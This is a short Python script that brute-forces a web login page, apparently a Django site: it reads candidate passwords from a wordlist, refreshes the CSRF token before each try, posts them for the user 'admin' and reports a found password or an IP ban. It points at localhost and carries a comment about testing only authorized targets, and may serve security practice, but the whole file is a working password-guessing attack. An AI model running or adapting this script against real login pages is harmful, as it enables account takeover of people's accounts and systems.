import requests
from colorama import Fore

TARGET_URL = "http://127.0.0.1:8000/login/"  # Always test on local/authorized targets
USERNAME = "admin"
PASSWORD_FILE = "passwords.txt"


def start_brute():
    client = requests.Session()

    try:
        with open(PASSWORD_FILE, "r") as file:
            for line in file:
                password = line.strip()

                # Refresh GET to ensure token is valid per attempt if needed
                response = client.get(TARGET_URL)
                csrftoken = client.cookies.get('csrftoken', '')

                data = {
                    'username': USERNAME,
                    'password': password,
                    'csrfmiddlewaretoken': csrftoken
                }

                res = client.post(TARGET_URL, data=data, headers=dict(Referer=TARGET_URL))

                if res.status_code == 403:
                    print(f"{Fore.RED}[!] BANNED: Server blocked the IP.{Fore.RESET}")
                    break

                # Check for success
                if "Dashboard" in res.text or res.status_code == 302:
                    print(f"{Fore.GREEN}[+] SUCCESS: Password found -> {password}{Fore.RESET}")
                    return
                else:
                    print(f"[-] Failed: {password}")

    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] Error: {PASSWORD_FILE} not found.{Fore.RESET}")


start_brute()